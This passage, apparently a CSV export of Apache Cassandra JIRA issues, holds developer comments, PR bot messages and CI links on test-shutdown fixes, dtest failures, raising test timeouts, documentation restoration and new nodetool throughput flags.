So I suspect this might be our solution. To be investigated. ",,e.dimitrova,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17760,,,,,,,,,,0.0,e.dimitrova,,,,,,,,,,,,,,Degradation,,,,,,,,Low Hanging Fruit,User Report,,false,CASSANDRA-16895,,,,,,,,,,,,,,,,9223372036854775807,,None,,Mon Jul 18 14:45:44 UTC 2022,,,,,,,All,,,,"0|z16mog:",9223372036854775807,,,,brandon.williams,e.dimitrova,,,Normal,,,,https://github.com/apache/cassandra-dtest/commit/4e93c84b2c2e8f789a0a28704b23d675debc8e79,,,,,,,,,"No new tests added, tested all current python tests that use Jolokia",,,,,"05/Jul/22 23:34;e.dimitrova;Patch submitted [here |https://github.com/ekaterinadimitrova2/cassandra-dtest/pull/new/17732] 

This will affect all branches but for now I am submitting [preliminary CI run|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17732-trunk&filter=all] to see how things look like. I will check on some of the failures we've seen recently too.

More tomorrow. ;;;","15/Jul/22 20:53;e.dimitrova;I tried to reproduce the failure [here|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1777/workflows/0c9e66c2-8f1a-4249-901d-33fbf8c5f501/jobs/12951] with no success. But we see also other tests failing with that error.

So I am fairly confident we need this update and it won't break anything.

I rebased the DTest patch and submitted Python DTests for all branches: 

[cassandra-3.0|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1778/workflows/3ac2351a-89a3-45d0-990e-2254e3974b77], [cassandra-3.11|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1779/workflows/ec3fe1cf-649c-46d1-aaff-eb3e71cec57e], [cassandra-4.0|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17732-4.0], [cassandra-4.1|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17732-4.1], [trunk|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17732-trunk];;;","15/Jul/22 21:00;brandon.williams;I agree we need this, +1 on the patch if CI looks good.;;;","16/Jul/22 16:32;e.dimitrova;3.0 226 upgrade tests timed out. Restarted them [here|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1778/workflows/3ac2351a-89a3-45d0-990e-2254e3974b77/jobs/13015] as I suspect environmental issue.

3.11 upgrade tests also timeout. Restarted them [here|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1779/workflows/ec3fe1cf-649c-46d1-aaff-eb3e71cec57e/jobs/13030]

The rest looks quite good - 4.1 and trunk are fully green, 4.0 has only 2 known flaky tests failing;;;","18/Jul/22 13:07;e.dimitrova;I am fairly sure the upgrade tests failures are not related and are known but for confirmation I just started them with unpatched [3.0|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1783/workflows/03577cf2-2be9-4b14-8339-d9ae4f4b4a22] and [3.11|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1784/workflows/9a787e4f-3b3b-4926-8253-d3405261895f].

 ;;;","18/Jul/22 14:39;e.dimitrova;Same failures popped up. I will commit this patch and open a follow up ticket for those upgrade tests as also it seems some of them are skipped in Jenkins, needs to be clarified.;;;","18/Jul/22 14:45;e.dimitrova;To https://github.com/apache/cassandra-dtest.git

   bab2c0f0..4e93c84b  trunk -> trunk;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Clean up ScheduledExecutors, CommitLog, and MessagingService shutdown for in-JVM dtests",CASSANDRA-17731,13470201,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,maedhroz,maedhroz,maedhroz,05/Jul/22 20:01,06/Oct/22 15:30,13/Jul/23 08:40,14/Jul/22 16:56,4.0.6,4.1-beta1,5.0,,,,Test/dtest/java,,,,0,,"There appear to be two problems w/ the way we shut down {{ScheduledExecutors}} in Instance in 4.0+:

1.) We do it twice, Ince as part of a larger batch of shutdown activity, and then again in its own {{parallelRun()}} block.
2.) It happens before {{MessagingService}} shuts down, but some messaging-related threads (see {{StreamSession#closeSession()}}) can submit tasks to {{nonPeriodicTasks}}.

We should do it once, and do it after the {{MessagingService}} has properly shut down.",,dcapwell,maedhroz,,,,,,,,,,,,,"maedhroz commented on PR #1724:
URL: https://github.com/apache/cassandra/pull/1724#issuecomment-1182528089

   https://app.circleci.com/pipelines/github/maedhroz/cassandra?branch=CASSANDRA-17731-4.0


;12/Jul/22 21:43;githubbot;600","maedhroz commented on PR #1724:
URL: https://github.com/apache/cassandra/pull/1724#issuecomment-1182528624

   Multiplexer run for `readWriteDuringBootstrapTest`:
   
   https://app.circleci.com/pipelines/github/maedhroz/cassandra?branch=CASSANDRA-17731-4.0-multiplexer


;12/Jul/22 21:44;githubbot;600","maedhroz commented on PR #1726:
URL: https://github.com/apache/cassandra/pull/1726#issuecomment-1183432025

   https://app.circleci.com/pipelines/github/maedhroz/cassandra?branch=CASSANDRA-17731-4.1


;13/Jul/22 16:27;githubbot;600","maedhroz commented on PR #1728:
URL: https://github.com/apache/cassandra/pull/1728#issuecomment-1183432297

   https://app.circleci.com/pipelines/github/maedhroz/cassandra?branch=CASSANDRA-17731-trunk


;13/Jul/22 16:27;githubbot;600","dcapwell commented on code in PR #1724:
URL: https://github.com/apache/cassandra/pull/1724#discussion_r920566911


##########
test/distributed/org/apache/cassandra/distributed/test/RepairErrorsTest.java:
##########
@@ -145,9 +145,7 @@ public void testRemoteStreamFailure() throws Exception
     @SuppressWarnings(""Convert2MethodRef"")
     private void assertNoActiveRepairSessions(IInvokableInstance instance)
     {
-        // Make sure we've cleaned up sessions and parent sessions:
-        Integer parents = instance.callOnInstance(() -> ActiveRepairService.instance.parentRepairSessionCount());
-        assertEquals(0, parents.intValue());

Review Comment:
   why?



;13/Jul/22 22:39;githubbot;600","dcapwell commented on code in PR #1724:
URL: https://github.com/apache/cassandra/pull/1724#discussion_r920569014


##########
test/distributed/org/apache/cassandra/distributed/test/RepairErrorsTest.java:
##########
@@ -145,9 +145,7 @@ public void testRemoteStreamFailure() throws Exception
     @SuppressWarnings(""Convert2MethodRef"")
     private void assertNoActiveRepairSessions(IInvokableInstance instance)
     {
-        // Make sure we've cleaned up sessions and parent sessions:
-        Integer parents = instance.callOnInstance(() -> ActiveRepairService.instance.parentRepairSessionCount());
-        assertEquals(0, parents.intValue());

Review Comment:
   ```On the RepairErrorsTest thing, that was causing testRemoteSyncFailure to flake every now and then...looked, and it seems that's updated async, so just related to look at the local sessions.
   (nobody had reported a Jira for that one, but you can see it in Butler)```



;13/Jul/22 22:43;githubbot;600","maedhroz commented on PR #1724:
URL: https://github.com/apache/cassandra/pull/1724#issuecomment-1184672435

   Committed in https://github.com/apache/cassandra/commit/d51f90201b2d127166612384a75b4a49da9776d1


;14/Jul/22 16:54;githubbot;600","maedhroz closed pull request #1724: CASSANDRA-17731 4.0 Clean up ScheduledExecutors, CommitLog, and MessagingService shutdown for in-JVM dtests
URL: https://github.com/apache/cassandra/pull/1724


;14/Jul/22 16:54;githubbot;600","maedhroz commented on PR #1726:
URL: https://github.com/apache/cassandra/pull/1726#issuecomment-1184673362

   Committed as https://github.com/apache/cassandra/commit/9bd32771e3983efdb0b135699a036c91e89b52dd


;14/Jul/22 16:55;githubbot;600","maedhroz closed pull request #1726: CASSANDRA-17731 4.1 Clean up ScheduledExecutors, CommitLog, and MessagingService shutdown for in-JVM dtests
URL: https://github.com/apache/cassandra/pull/1726


;14/Jul/22 16:55;githubbot;600","maedhroz commented on PR #1728:
URL: https://github.com/apache/cassandra/pull/1728#issuecomment-1184673804

   Committed as https://github.com/apache/cassandra/commit/889ca60edc8afd85b4a594442883c1b5efdf3c6b


;14/Jul/22 16:56;githubbot;600","maedhroz closed pull request #1728: CASSANDRA-17731 trunk Clean up ScheduledExecutors, CommitLog, and MessagingService shutdown for in-JVM dtests
URL: https://github.com/apache/cassandra/pull/1728


;14/Jul/22 16:56;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,7200,,,0,7200,,,,,,,,CASSANDRA-17139,,,,,,,,,,,,,CASSANDRA-16778,,,,,,CASSANDRA-17139,,,,,,,,,,,,,,,,,,,,0.0,maedhroz,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Low Hanging Fruit,Code Inspection,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Thu Jul 14 16:56:28 UTC 2022,,,,,,,All,,,,"0|z16mn4:",9223372036854775807,,,,dcapwell,,,,Low,,4.0,,https://github.com/apache/cassandra/commit/d51f90201b2d127166612384a75b4a49da9776d1,,,,,,,,,n/a (the patch itself is test fixes),,,,,"12/Jul/22 21:24;maedhroz;I kind of have a feeling shutdown order is also underlying CASSANDRA-17139, and this patch might address it. Once the tests are clean in a normal run, I'll throw the multiplexer at that...;;;","13/Jul/22 02:05;maedhroz;The [multiplexer agrees with me|https://app.circleci.com/pipelines/github/maedhroz/cassandra/468/workflows/140e4741-3aab-40b4-873c-273405f5504c/jobs/4313/tests]. The patch for this issue seems to fix CASSANDRA-17139. Working on 4.1 and trunk...;;;","13/Jul/22 16:30;maedhroz;Here are the patches and test runs:

|4.0|[patch|https://github.com/apache/cassandra/pull/1724]|[CircleCI|https://app.circleci.com/pipelines/github/maedhroz/cassandra?branch=CASSANDRA-17731-4.0]|
|4.1|[patch|https://github.com/apache/cassandra/pull/1726]|[CircleCI|https://app.circleci.com/pipelines/github/maedhroz/cassandra?branch=CASSANDRA-17731-4.1]|
|trunk|[patch|https://github.com/apache/cassandra/pull/1728]|[CircleCI|https://app.circleci.com/pipelines/github/maedhroz/cassandra?branch=CASSANDRA-17731-trunk]|;;;","13/Jul/22 22:47;dcapwell;+1;;;","14/Jul/22 16:56;maedhroz;Committed.

4.0 - [https://github.com/apache/cassandra/commit/d51f90201b2d127166612384a75b4a49da9776d1]

4.1 - [https://github.com/apache/cassandra/commit/9bd32771e3983efdb0b135699a036c91e89b52dd]

trunk - [https://github.com/apache/cassandra/commit/889ca60edc8afd85b4a594442883c1b5efdf3c6b];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ttl_test.py::TestRecoverNegativeExpirationDate::test_recover_negative_expiration_date_sstables_with_scrub failing on CircleCI,CASSANDRA-17730,13470193,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,brandon.williams,maedhroz,maedhroz,05/Jul/22 18:54,05/Oct/22 22:22,13/Jul/23 08:40,13/Jul/22 16:05,4.0.5,4.1,4.1-beta1,,,,Test/dtest/python,,,,0,,"It doesn’t appear on Butler, but on 4.0, 4.1, and trunk, {{ttl_test.py::TestRecoverNegativeExpirationDate.test_recover_negative_expiration_date_sstables_with_scrub}} is failing in {{copy_tree}} w/ a {{DistutilsFileError}}.

{noformat}
        if not dry_run and not os.path.isdir(src):
            raise DistutilsFileError(
>                 ""cannot copy tree '%s': not a directory"" % src)
E           distutils.errors.DistutilsFileError: cannot copy tree 'sstables/ttl_test/3.11': not a directory

/usr/lib/python3.6/distutils/dir_util.py:127: DistutilsFileError
{noformat}

See https://app.circleci.com/pipelines/github/maedhroz/cassandra?branch=CASSANDRA-17706-4.0-CircleCI&filter=all

(This is just vanilla cassandra-4.0 w/ HIGHRES CircleCI settings.)",,e.dimitrova,maedhroz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,brandon.williams,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,DTest,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed Jul 13 16:05:57 UTC 2022,,,,,,,All,,,,"0|z16mm0:",9223372036854775807,,,,maedhroz,,,,Normal,,NA,,https://github.com/apache/cassandra-dtest/commit/c40973f6376fd80e5e0b5efddaa488a23ff1793a,,,,,,,,,run CI,,,,,"11/Jul/22 17:12;brandon.williams;Our use of disutils to copy the tree here is probably because shutil's copytree doesn't allow directories to exist until python [3.8|https://docs.python.org/3/whatsnew/3.8.html#shutil], and we aren't controlling the disutils version so it's likely different on Circle.

[Here|https://github.com/driftx/cassandra-dtest/tree/CASSANDRA-17730]'s a patch to use our own copytree instead (with shutil under the hood) and it passes [100 runs on circle|https://app.circleci.com/pipelines/github/driftx/cassandra/541/workflows/ceb21b73-91fc-42ce-81fc-8bfc76e33b75/jobs/6509].;;;","11/Jul/22 17:33;e.dimitrova;Interesting, I am wondering why it fails constantly with HIGHRES but never with MIDRES (I mean before this patch), our CI will never stop amusing me :D ;;;","11/Jul/22 17:34;maedhroz;+1

Thanks!;;;","11/Jul/22 17:40;brandon.williams;Committed, thanks.;;;","13/Jul/22 02:18;maedhroz;I think this is still failing: https://app.circleci.com/pipelines/github/maedhroz/cassandra/467/workflows/2bd1a22c-f260-4d4e-b2fb-559cb7745f1b/jobs/4290/tests#failed-test-0

(HIGHRES, btw);;;","13/Jul/22 11:06;brandon.williams;bq. I am wondering why it fails constantly with HIGHRES but never with MIDRES

Well count me in that group now.  At least with the other error out of the way this looks more like some kind of race, I'll take another look.;;;","13/Jul/22 14:43;brandon.williams;Ok, round 2!

I suspect that highres is at least sometimes, for whatever purpose, changing the CWD.  The test is probably at fault here for not using an explicit path, which [this patch|https://github.com/driftx/cassandra-dtest/tree/CASSANDRA-17730] does and survives [500 runs at HIGHRES|https://app.circleci.com/pipelines/github/driftx/cassandra/542/workflows/5d5fca15-ccf7-42c1-8c64-e287a4ec8c82/jobs/6512].;;;","13/Jul/22 15:54;maedhroz;+1;;;","13/Jul/22 16:05;brandon.williams;Committed.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Raise test timeouts,CASSANDRA-17729,13470034,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,bereng,bereng,bereng,05/Jul/22 04:34,07/Mar/23 10:38,13/Jul/23 08:40,14/Jul/22 09:45,4.1-beta1,5.0,,,,,Test/unit,,,,0,,"We have seen for some time now junits timeout frequently on jenkins. This is probably down to it being a very loaded env. On circle we don't observe that behavior probably bc it's not so loaded.

The question is whether it is time to raise timeouts as they might be hiding legit failures. As en experiment I raised timeouts in a branch and ran jenkins against it. What I see is that the last 4.1 run had 14 failures out of which 12 were timeouts. Increasing timeouts reveals what looks to be 9 legit failures where 2 are timeouts that probably need to be investigated.",,bereng,jmckenzie,mck,,,,,,,,,,,,"smiklosovic closed pull request #1731: Raisedtimeouts trunk CASSANDRA-17729
URL: https://github.com/apache/cassandra/pull/1731


;27/Jul/22 13:40;githubbot;600","smiklosovic closed pull request #1730: Raisedtimeouts 4.1 CASSANDRA-17729
URL: https://github.com/apache/cassandra/pull/1730


;27/Jul/22 13:41;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,1200,,,0,1200,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,bereng,,,,,,,,,,,,,,Degradation,,,,,,,,Normal,Unit Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Thu Jul 14 09:45:34 UTC 2022,,,,,,,All,,,,"0|z16lmw:",9223372036854775807,,,,bereng,mck,,,Normal,,4.1-alpha1,,https://github.com/apache/cassandra/commit/14fc06a3ce007b0cbf3bc88c3d8c247da65fc036,,,,,,,,,In the ticket,,,,,"05/Jul/22 04:39;bereng;||Branch||Jenkins||Circle||
|[4.1 branch|https://github.com/bereng/cassandra/tree/raisedtimeouts-4.1]|[CI jenkins|https://ci-cassandra.apache.org/view/all/job/Cassandra-devbranch/1822/]|[CI circle|https://app.circleci.com/pipelines/github/bereng/cassandra/694/workflows/c08784ea-a9c8-49d5-abd9-0339f2338280]|
;;;","05/Jul/22 16:06;jmckenzie;4.1 branch link doesn't appear to be valid;;;","06/Jul/22 05:39;bereng;^Ah well yes apologies. It works better if you actually link sthg to it :-)

[~jmckenzie] mentioned on the ML:

{quote}Another option would be to increase the resources dedicated to each agent container and run less in parallel. Or, best yet, do both (up timeouts and lower parallelization / up resources).

As far as I can tell the failures on Jenkins aren't value-add compared to what we're seeing on circleci and are just generating busywork.

There's a reasonable discussion to be had about ""what's the smallest footprint of hardware we consider C* supported on"" and targeting ASF CI to validate that. I believe the noisy env + low resources on ASF CI currently are lower than whatever floor we'd reasonably agree on.{quote}

I agree more resources would be great. And we're now on a degraded situation while some workers are offline getting their 'full HDD' issues fixed. Also setting some HW baseline seems like a good point.

On the other hand I can't stop finding legit bugs on jenkins runs. Being a contended env, as opposed to circle, many bugs that circle would never show come up in jenkins. The problem is being able to find those within all the noise in jenkins. That's why it is so important to get to green and _keep it_ like that. Otherwise the noise hides the legit failures.;;;","06/Jul/22 10:43;mck;Agree with the notion that Jenkins (lower resources/more contention) is better at exposing flakies, but that there's a trade-off between encouraging flakies and creating difficult-to-deal-with noise.

While I'm for raising the discussion about what is the base hardware requirement (once HDD issues are resolved and all agents are active again), I don't see this as an argument not to continuously improve tests to be more robust. So +1 to the patch.;;;","06/Jul/22 15:26;jmckenzie;{quote}I can't stop finding legit bugs on jenkins runs
{quote}
You're seeing bugs showing up in Jenkins that don't show in circle that users could expect to see in a reasonably provisioned C* cluster?;;;","07/Jul/22 04:50;bereng;Through all the reviews and tests fixes I have done all this time there are plenty that will only repro on circle or only on jenkins, yes. And I think that is shared pov if you ask at least in my team.  It is common for me to be involved in tickets that only repro on jenkins. In fact the jenkins run in this ticket is showing a few that don't show on the matching circle run.

How this would relate to a 'properly' provisioned cluster, which we would have to define, I can't tell. I see your point right, bc there are some snakes in the grass, but If they are only doing noise is sthg to discuss as in any dist environment you will have timeouts and resource contraints. But at the moment jenkins is our official CI so any bugs there need ironing iiuc.

i.e CASSANDRA-17232 is sthg that comes up in jenkins a lot. On circle we only get it looping the test a1000 times and with difficulty.;;;","07/Jul/22 15:38;jmckenzie;bq. at the moment jenkins is our official CI so any bugs there need ironing 
In my mind there's a distinction between a ""test bug"" and a ""product bug"". I don't deny we have many of the former, but we may not agree on the relative value of spending time fixing things that only show up in highly contended, lowly provisioned test runtime environments.

Let's continue this discussion on the dev ML thread?;;;","14/Jul/22 08:25;bereng;||PR||CI||
|4.1 https://github.com/apache/cassandra/pull/1730|Ci [j8|https://app.circleci.com/pipelines/github/bereng/cassandra/718/workflows/3f3a4b86-3110-4a95-be1b-5c2eb92cc507] CI [j11|https://app.circleci.com/pipelines/github/bereng/cassandra/718/workflows/128a413f-59d5-4b00-acc1-c3a11a453433]|
|Trunk https://github.com/apache/cassandra/pull/1731|CI [j8|https://app.circleci.com/pipelines/github/bereng/cassandra/719/workflows/8408ab3a-333c-4c10-bd67-34542ee2984a] CI [j11|https://app.circleci.com/pipelines/github/bereng/cassandra/719/workflows/66ba9760-cb63-4596-8e48-47d65e39f639]|

Unrelated errors imo;;;","14/Jul/22 09:45;bereng;Thanks [~mck] and the rest for the help here!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Remove read_repair table option from <4.0 docs, and restore read_repair_chance docs",CASSANDRA-17727,13469756,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,milan_k,mck,mck,02/Jul/22 10:34,16/Jul/22 11:08,13/Jul/23 08:40,16/Jul/22 11:08,3.11.14,,,,,,Documentation,,,,0,,"CASSANDRA-16763 added the read_repair docs to all versions. It should only have been added to 4.0 onwards.

The 3.11 docs is now missing the read_repair_chance information.

See doc/modules/cassandra/pages/cql/ddl.adoc and doc/modules/cassandra/pages/operating/read_repair.adoc ",,mck,milan_k,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-16763,,,,,,,,,,,,,,,,,,,,,,,,,,,"14/Jul/22 02:28;milan_k;CASSANDRA-17727-3.11.txt;https://issues.apache.org/jira/secure/attachment/13046732/CASSANDRA-17727-3.11.txt",,,,,1.0,milan_k,,,,,,,,,,,,,,Documentation,,,,,,,,Low Hanging Fruit,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Sat Jul 16 11:08:34 UTC 2022,,,mck,,,,All,,,,"0|z16jx4:",9223372036854775807,,,,mck,,,,Critical,,3.11.12,,https://github.com/apache/cassandra/commit/c2148980cea9ff3d46fafa52658b5336fb461d37,,,,,,,,,Changes were done only in the documentation.,,,,,"13/Jul/22 13:09;milan_k;Hello, I would like to start working on this ticket. 

I have looked at past revisions of the 3.11, but I haven't found read_repair_chance documentation which I could restore.

Regarding read_repair.adoc - is it sufficient to just delete thid doc file?;;;","13/Jul/22 15:00;mck;[~milan_k], the old (previous) docs with it exists here: https://github.com/apache/cassandra/blob/b3cdc131ab53fe9affd6115ac9e3aaf495ea8530/doc/source/cql/ddl.rst 

So we will need a rewrite of that rst into adoc.;;;","14/Jul/22 23:55;milan_k;Thank you for your answer. I have published the patch. However, I am going through this process for the first time. Please, let me know if I have forgotten something.;;;","15/Jul/22 11:38;mck;Patch is looking good! 

One small thing, can you undo the changes in `alter_table_with_comment.cql` and `create_table.cql`, i can't see the purpose of adding them in (not related to those examples afaik).
;;;","15/Jul/22 12:07;milan_k;Thanks for your comment. I wanted to restore the version you have linked and I have seen there also examples with read_repair_chance. Otherwise, there would be no examples of usage I think in the documentation.

* Create table example:
https://github.com/apache/cassandra/blob/b3cdc131ab53fe9affd6115ac9e3aaf495ea8530/doc/source/cql/ddl.rst#create-table

* Alter table example:
https://github.com/apache/cassandra/blob/b3cdc131ab53fe9affd6115ac9e3aaf495ea8530/doc/source/cql/ddl.rst#alter-table

But if you think that I should remove them I will update it.;;;","15/Jul/22 13:14;mck;bq.  I wanted to restore the version…

Fair enough. +1 on the patch as it is;;;","16/Jul/22 11:04;mck;

I put your patch into this fork/branch:
https://github.com/apache/cassandra/compare/trunk...thelastpickle:cassandra:mck/17727/3.11


Testing it brought up that this section needed to be removed as well: https://github.com/apache/cassandra/compare/trunk...thelastpickle:cassandra:mck/17727/3.11#diff-daf75083179e6ae0c31b8dc2f8b06360c3655bcd537804bd3b8298032c8ae291R691-R720

I did that on your patch before committing it. 

Thank you [~milan_k] for the quick contribution on this! ;;;","16/Jul/22 11:08;mck;Committed as [c2148980cea9ff3d46fafa52658b5336fb461d37|https://github.com/apache/cassandra/commit/c2148980cea9ff3d46fafa52658b5336fb461d37].;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Add a flag for throughput in MiB/s for nodetool setstreamthroughput, getstreamthroughput, setinterdcstreamthroughput and getinterdcstreamthroughput ",CASSANDRA-17725,13469671,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,e.dimitrova,e.dimitrova,e.dimitrova,01/Jul/22 14:19,05/Oct/22 22:22,13/Jul/23 08:40,02/Aug/22 01:05,4.1,4.1-beta1,,,,,Tool/nodetool,,,,0,,"As we agreed not to add new JMX methods for the new config on the mailing list, we need at least new flags for setstreamthroughput and interdcstreamthroughput for the two 4.0 parameters to be set/get also in MiB, not only in megabits.

Thus we will have the option either to use the old version for those 2, or to be able to set/get in MiB all 4 streaming parameters. As of 4.1 supported units for DataRateSpec are MiB/s, B/s, KiB/s, megabit is only for legacy from 4.0 - backward compatibility. 

To be sure we satisfy the requirements around the latest discussions about backward compatibility in tools, I will use this ticket also to make a final pass on the unit changes done, to ensure the probe output is not affected.
----
Final patch consists of:

- Uncomment prepared_statements_cache_size, key_cache_size, counter_cache_size, index_summary_capacity which were
commented out by mistake in a previous patch
- Fix breaking change with cache_load_timeout; cache_load_timeout_seconds <=0 and cache_load_timeout=0 are equivalent
and they both mean disabled
- Deprecate public method setRate(final double throughputMbPerSec) in Compaction Manager in favor of
setRateInBytes(final double throughputBytesPerSec)
- Revert breaking change removal of StressCQLSSTableWriter.Builder.withBufferSizeInMB(int size). Deprecate it in favor
of StressCQLSSTableWriter.Builder.withBufferSizeInMiB(int size)
- Fix precision issues, add new -m flag (for nodetool/setstreamthroughput, nodetool/setinterdcstreamthroughput,
nodetool/getstreamthroughput and nodetoo/getinterdcstreamthroughput), add new -d flags (nodetool/getstreamthroughput, nodetool/getinterdcstreamthroughput, nodetool/getcompactionthroughput)
- Fix a bug with precision in nodetool/compactionstats
- Deprecate StorageService methods and add new ones for stream_throughput_outbound, inter_dc_stream_throughput_outbound,
compaction_throughput_outbound in the JMX MBean `org.apache.cassandra.db:type=StorageService`
- Removed getEntireSSTableStreamThroughputMebibytesPerSec in favor of new getEntireSSTableStreamThroughputMebibytesPerSecAsDouble
in the JMX MBean `org.apache.cassandra.db:type=StorageService`
- Removed getEntireSSTableInterDCStreamThroughputMebibytesPerSec in favor of getEntireSSTableInterDCStreamThroughputMebibytesPerSecAsDouble
in the JMX MBean `org.apache.cassandra.db:type=StorageService`

It is the same for 4.1 and trunk

 ",,e.dimitrova,frankgh,maedhroz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17790,,,,,,,,,,0.0,e.dimitrova,,,,,,,,,,,,,,Correctness,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue Aug 02 01:02:27 UTC 2022,,,,,,,All,,,,"0|z16je8:",9223372036854775807,,,,frankgh,maedhroz,,,Low,,4.1-alpha1,,https://github.com/apache/cassandra/commit/dd08314ed654aafa60b2a82fc4953aac171ba3ef,,,,,,,,,"2 new test classes added. CI running here for the 4.1 branch: [j8|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1767/workflows/5f62f5d2-0930-4084-9031-61e1087b22fb], [j11|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1767/workflows/781c87d6-9ea1-45ad-838e-53e0d9ee50ee]

[4.1 branch|https://github.com/ekaterinadimitrova2/cassandra/tree/nodetool-flags-4.1]
[4.1 diff|https://github.com/apache/cassandra/compare/cassandra-4.1...ekaterinadimitrova2:cassandra:nodetool-flags-4.1]

Please read the comments for the details and outstanding questions",,,,,"01/Jul/22 14:40;e.dimitrova;interdcstreamthroughput flags added in this  [commit|https://github.com/ekaterinadimitrova2/cassandra/commit/d5e7134c99e5e938b74c2ad74fbf2c916f0785ce] and streamthroughput flag added in this [commit|https://github.com/ekaterinadimitrova2/cassandra/commit/9c6e1452a939ad5420daa5eefce33ac5b6e050ec] 

The only thing I am wondering here is how to handle that nodetool and the StorageService JMX methods are rounding to int and 0 very small values in megabits to MiB/s (the getters in MiB, when we provide too small megabits) I added in nodetool a check that will say instead of unlimited - 1 MiB/s. I plan to document that when you use one or the other unit you should use the respective setter/getter as otherwise you might see that side effect. Seeing 0 in MiB - someone might decide that they are unthrottling when in reality they have super low value in megabits internally. What do others think about this?

I had a few findings which I addressed in separate commits:
